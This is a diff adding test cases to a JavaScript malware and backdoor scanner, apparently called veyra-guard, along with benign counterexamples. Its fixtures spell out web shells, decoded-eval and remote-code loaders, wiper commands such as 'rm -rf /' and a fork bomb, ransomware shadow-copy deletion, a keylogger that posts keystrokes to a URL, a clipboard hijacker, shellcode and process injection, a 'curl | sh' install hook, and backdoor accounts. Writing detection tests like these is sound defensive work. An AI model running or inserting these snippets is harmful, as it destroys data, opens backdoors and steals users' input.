@@ -213,3 +213,133 @@ test("documentation is only checked for hidden characters and leaked keys", () =
   has(j("Note: ", "\u202E", " hidden"), "trojan-source", "README.md");
   has(j("key: AKI", "AQ4XN7ZK2PB9RW3TY"), "secret", "notes.txt");
 });
+
+test("web shells in PHP, ASP, JSP, Node.js, Python and Ruby", () => {
+  has(j("<?php ev", "al($_PO", "ST['c']); ?>"), "webshell", "upload/x.php");
+  has(j("<?php sys", "tem($_GE", "T['cmd']); ?>"), "webshell", "x.php");
+  has(j("<?php $_GE", "T['f']($_GET['a']); ?>"), "webshell", "x.php");
+  has(j("<% ev", "al(Request.Form(\"c\")) %>"), "webshell", "x.aspx");
+  has(j("Runtime.getRuntime().ex", "ec(request.getParameter(\"c\"));"), "webshell", "x.jsp");
+  has(j("app.get('/x', (req, res) => ex", "ec(req.query.cmd));"), "webshell", "server.js");
+  has(j("os.sys", "tem(request.args.get('c'))"), "webshell", "app.py");
+  has(j("sys", "tem(params[:cmd])"), "webshell", "app/controllers/x_controller.rb");
+  clean("<?php echo htmlspecialchars($_GET['name']); ?>", "x.php");
+  clean("const id = req.query.id; db.find(id);", "server.js");
+});
+
+test("hidden code is decoded and run in many languages", () => {
+  has(j("<?php ev", "al(gzinf", "late(base64_dec", "ode('eJzLSM3JyQcABiwCFQ=='))); ?>"), "eval-decoded", "x.php");
+  has(j("ev", "al(Base64.dec", "ode64(payload))"), "eval-decoded", "x.rb");
+  has(j("ev", "al(decode_b", "ase64($blob));"), "eval-decoded", "x.pl");
+  has(j("loadstr", "ing(dec", "ode_base64(s))()"), "eval-decoded", "x.lua");
+  has(j("Assembly.Lo", "ad(Convert.FromBase64", "String(b));"), "eval-decoded", "x.cs");
+  clean("assert.equal(atob('aGk='), 'hi');", "test/a.test.js");
+  clean("// load the atob polyfill first", "a.js");
+});
+
+test("code downloaded and run at run time", () => {
+  has(j("ex", "ec(requests.g", "et('https://x.test/p.py').text)"), "remote-code-load", "x.py");
+  has(j("ev", "al(await (await fet", "ch('https://x.test/a.js')).text());"), "remote-code-load", "x.js");
+  has(j("loadstr", "ing(game:Http", "Get('https://x.test/s.lua'))()"), "remote-code-load", "x.lua");
+  has(j("ev", "al(file_get_con", "tents('https://x.test/s.txt'));"), "remote-code-load", "x.php");
+  has(j("pickle.lo", "ads(requests.g", "et(u).content)"), "remote-code-load", "x.py");
+  clean("const data = JSON.parse(await (await fetch(url)).text());", "a.js");
+  clean("cfg = json.load(urlopen(url))", "a.py");
+});
+
+test("wipers, ransomware and protestware", () => {
+  has(j("rm -r", "f / --no-preserve-root"), "destructive-command", "x.sh");
+  has(j("rm -r", "f ~"), "destructive-command", "x.sh");
+  has(j("rm -r", "f \"$HOME\""), "destructive-command", "x.sh");
+  has(j("dd if=/dev/ze", "ro of=/dev/sda bs=1M"), "destructive-command", "x.sh");
+  has(j(":(){ :|:& ", "};:"), "destructive-command", "x.sh");
+  has(j("del /f /s /q ", "C:\\*"), "destructive-command", "x.bat");
+  has(j("shutil.rmt", "ree(os.path.expanduser('~'))"), "destructive-command", "x.py");
+  has(j("fs.rmS", "ync(os.homedir(), { recursive: true, force: true });"), "destructive-command", "x.js");
+  has(j("CreateFile(\"\\\\\\\\.\\\\Physical", "Drive0\", GENERIC_WRITE, 0, 0, 3, 0, 0);"), "destructive-command", "x.c");
+  clean("rm -rf /tmp/build-cache ./dist ~/.cache/x", "clean.sh");
+  clean("rm -rf node_modules/", "clean.sh");
+  clean("del /q C:\\temp\\old.log", "x.bat");
+  clean("shutil.rmtree(tmpdir)", "x.py");
+  has(j("vssadmin del", "ete shadows /all /quiet"), "ransomware", "x.bat");
+  has(j("bcdedit /set {default} recoverye", "nabled no"), "ransomware", "x.bat");
+  has(j("note = 'Your files have been encr", "ypted! Send 0.5 bitcoin to recover them.'"), "ransomware", "x.py");
+});
+
+test("spyware: keyloggers and clipboard hijackers", () => {
+  has(j("from pynput import keyb", "oard\ndef on_press(k):\n    requests.post(URL, data=str(k))"), "keylogger", "x.py");
+  has(j("if (GetAsyncKe", "yState(i) & 1) fprintf(log, \"%c\", i);"), "keylogger", "x.c");
+  clean("if (GetAsyncKeyState(VK_SPACE)) player.jump();", "game.cpp");
+  const clipper = j("import pyperclip, re\nBTC = re.compile(r'^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$')\nif BTC.match(pyperclip.paste()):\n    pyperclip.copy('1BoatSLRHtKNngkdXEeobR76b53LETtpyT')");
+  assert.deepEqual(g.scan(clipper, "x.py").filter(f => f.rule === "clipboard-hijack").map(f => f.line), [2, 4]);
+  clean("const addr = '0x52908400098527886E0F7030069857D2E4169EE7'; // donation address", "a.js");
+});
+
+test("native malware: shellcode, process injection, executable memory, anti-debugging", () => {
+  has(j("unsigned char buf[] = \"\\xfc\\x48\\x83\\xe4", "\\xf0\\xe8\\xc0\\x00\";"), "shellcode", "x.c");
+  has(j("byte[] buf = new byte[] { 0xfc, 0x48, 0x83, 0xe4", ", 0xf0, 0xe8 };"), "shellcode", "x.cs");
+  has(j("HANDLE h = OpenProcess(PROCESS_ALL_ACCESS, 0, pid);\nLPVOID m = VirtualAllocEx(h, 0, n, 0x3000, 0x40);\nWriteProcessMem", "ory(h, m, buf, n, 0);\nCreateRemoteThr", "ead(h, 0, 0, m, 0, 0, 0);"), "process-injection", "x.c");
+  has(j("addr = ctypes.windll.kernel32.VirtualAl", "loc(0, len(sc), 0x3000, 0x40)"), "exec-memory", "x.py");
+  has(j("void *p = mmap(0, n, PROT_READ | PROT_WRITE | PROT_E", "XEC, MAP_PRIVATE | MAP_ANON, -1, 0);"), "exec-memory", "x.c");
+  has(j("if (IsDebugger", "Present()) ExitProcess(0);"), "anti-analysis", "x.c");
+  clean("SetThreadContext(thread, &ctx); // our own debugger, no other process opened", "dbg.c");
+  clean("void *p = mmap(0, n, PROT_READ | PROT_WRITE, MAP_PRIVATE, fd, 0);", "x.c");
+});
+
+test("Office macros, SQL and build scripts", () => {
+  const macro = j("Sub AutoOpen()\n  Dim s\n  Set s = CreateObject(\"WScript.She", "ll\")\n  s.Run \"powershell -c Get-Date\"\nEnd Sub");
+  assert.deepEqual(g.scan(macro, "x.bas").filter(f => f.rule === "office-macro").map(f => f.line), [3, 4]);
+  clean("Sub FormatReport()\n  Range(\"A1\").Font.Bold = True\nEnd Sub", "x.bas");
+  has(j("EXEC xp_cmd", "shell 'whoami';"), "sql-command-exec", "x.sql");
+  has(j("COPY t FROM PROG", "RAM 'id';"), "sql-command-exec", "x.sql");
+  has(j("import os\nos.sys", "tem('curl -s http://x.test/a | sh')\nsetup(name='x')"), "build-time-execution", "setup.py");
+  has(j("let body = reqwe", "st::blocking::get(\"https://x.test/p\");"), "build-time-execution", "build.rs");
+  has(j("import base64;exe", "c(base64.b64decode('cHJpbnQoMSk='))"), "build-time-execution", "site-packages/evil.pth");
+  clean("exec(open('pkg/version.py').read())\nsubprocess.check_call(['cmake', '..'])\nsetup(name='x')", "setup.py");
+  clean("import os; var = 'SETUPTOOLS_USE_DISTUTILS'; enabled = os.environ.get(var, 'local') == 'local'", "distutils-precedence.pth");
+  clean("./some/path/to/add", "x.pth");
+});
+
+test("backdoor accounts and hard-coded logins", () => {
+  has(j("echo 'ssh-ed25519 AAAA attacker' >> ~/.ssh/authorized_", "keys"), "persistence", "x.sh");
+  has(j("net user support P@ssw0rd /a", "dd"), "persistence", "x.bat");
+  has(j("echo /tmp/x.so > /etc/ld.so.prel", "oad"), "persistence", "x.sh");
+  has(j("if (password === \"letmein", "2024\") return grantAdmin();"), "hardcoded-login", "src/auth.js");
+  has(j("if (strcmp(passwd, \"backdo", "or!\") == 0) return 1;"), "hardcoded-login", "auth.c");
+  clean("if (passwordType === \"text\") show();", "src/form.js");
+  clean("if (password === \"hunter22\") ok();", "test/auth.test.js");
+});
+
+test("zero-width joiners in emoji and other scripts are fine; between plain letters they are not", () => {
+  clean("const team = '\u{1F469}\u200D\u{1F4BB} and \u{1F468}\u200D\u{1F469}\u200D\u{1F467}';", "a.js");
+  clean("const fa = '\u0645\u06CC\u200C\u062E\u0648\u0627\u0647\u0645';", "a.js");
+  has(j("const is", "\u200D", "Admin = true;"), "invisible-character");
+  const { text, removed } = g.removeHiddenCharacters(j("const a", "\u200B", "b = '\u{1F469}\u200D\u{1F4BB}';\nlet x", "\u202E", " = 1;"));
+  assert.equal(removed, 2);
+  assert.equal(text, "const ab = '\u{1F469}\u200D\u{1F4BB}';\nlet x = 1;");
+});
+
+test("languages are recognised by name and extension", () => {
+  const cases = { "a.php": "PHP", "x/Main.java": "Java", "lib.rs": "Rust", "Dockerfile": "Docker", "Dockerfile.prod": "Docker", "build.gradle": "Groovy", "a.ps1": "PowerShell", "x.sol": "Solidity", "requirements-dev.txt": "Python", ".bashrc": "Shell script", "macro.bas": "Visual Basic", "README.md": "Markdown", "a.unknownext": undefined };
+  for (const [p, l] of Object.entries(cases)) assert.equal(g.languageOf(p), l, p);
+  assert.ok(g.LANGUAGES.length >= 70, `${g.LANGUAGES.length} languages`);
+  assert.deepEqual(g.languageCounts(["a.js", "b.js", "c.py", "d.unknown"]), [["JavaScript", 2], ["Python", 1]]);
+});
+
+test("custom rules from a team's settings or .veyra-guard.json", () => {
+  const customRules = [{ id: "no-internal-host", pattern: "internal\\.corp\\.example", severity: "medium", title: "Internal host name", fix: "Use the public API." }, { id: "php-only", pattern: "mysql_query", files: "*.php" }];
+  const f = g.scan("fetch('https://internal.corp.example/x')", "src/a.ts", { customRules });
+  assert.deepEqual(f.map(x => [x.rule, x.severity, x.title, x.fix]), [["no-internal-host", "medium", "Internal host name", "Use the public API."]]);
+  assert.deepEqual(rules("mysql_query($q);", "a.js", { customRules }), [], "files limits where a rule applies");
+  assert.deepEqual(rules("mysql_query($q);", "web/a.php", { customRules }), ["php-only"]);
+  assert.deepEqual(rules("x internal.corp.example", "notes.md", { customRules }), ["no-internal-host"], "custom rules also check documentation");
+  assert.deepEqual(rules("// veyra-guard-ignore: no-internal-host\nfetch('https://internal.corp.example/x')", "a.ts", { customRules }), [], "and can be ignored like any rule");
+  assert.match(g.compileCustomRules([{ id: "bad", pattern: "(" }]).errors[0], /invalid pattern/);
+  assert.match(g.compileCustomRules([{ id: "empty", pattern: ".*" }]).errors[0], /every line/);
+  const { config, error } = g.parseConfig('// team settings\n{ "minSeverity": "medium", "failOn": "critical", "ignorePaths": ["docs/**"], "disabledRules": ["raw-ip-url"], "customRules": [], "junk": 1 }');
+  assert.equal(error, undefined);
+  assert.deepEqual(config, { minSeverity: "medium", failOn: "critical", ignorePaths: ["docs/**"], disabledRules: ["raw-ip-url"], customRules: [] });
+  assert.match(g.parseConfig("{ nope").error, /isn't valid JSON/);
+  const m = g.globMatcher(["docs/**", "*.min.js"]);
+  assert.ok(m("docs/a/b.md") && m("web/x.min.js") && !m("src/docs.ts"));
+});
